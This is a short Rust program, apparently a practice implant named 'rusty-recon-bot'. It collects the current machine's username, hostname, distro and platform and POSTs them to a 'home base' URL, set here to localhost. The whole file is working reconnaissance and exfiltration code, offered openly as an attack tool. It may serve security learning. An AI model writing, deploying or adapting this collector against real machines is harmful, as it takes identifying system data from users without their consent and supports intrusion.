extern crate whoami;
extern crate reqwest;


use whoami::{desktop_env, devicename, distro, username, platform, hostname};


fn collect_info() -> String {
    let mut return_string: String = "================= SYSINFO =================".to_string();

    let session_username: String = username();
    let session_hostname: String = hostname();
    let session_distro: String = distro().to_string();
    let session_platform: String = platform().to_string();

    let mut str_username: String  = "❓ Username: ".to_string();
    let mut str_hostname: String  = "🏡 Hostname: ".to_string();
    let mut str_distro: String = "📀 Distro: ".to_string();
    let mut str_platform: String = "🖥️ Platform: ".to_string();

    str_username.push_str(&session_username);
    str_hostname.push_str(&session_hostname);
    str_distro.push_str(&session_distro);
    str_platform.push_str(&session_platform);


    return_string.push_str("\n");
    return_string.push_str(&str_username);
    return_string.push_str("\n");
    return_string.push_str(&str_hostname);
    return_string.push_str("\n");
    return_string.push_str(&str_distro);
    return_string.push_str("\n");
    return_string.push_str(&str_platform);


    return_string
}

fn exfil_info(info: String, url: String)  -> Result<String, String>{

    println!("[*] Sending the following info:\n {}", info);
    let client = reqwest::blocking::Client::new();
    if let Ok(r) = client.post(&url)
        .body(info)
        .send() {
            if r.status().is_success() {
                return Ok("[*] Success!".to_string());
            } else {
                return Err("something went wrong".to_string());
            }
        } else {
            return Err("something went wrong".to_string());
        }
}


fn main() {
    println!("[!] Beep boop, I am rusty-recon-bot! I will collect information from this endpoint and send it back to home base.");
    let return_string = collect_info();
    let resp = exfil_info(return_string, "http://127.0.0.1".to_string());
    println!("[*] All done! Goodbye");

}

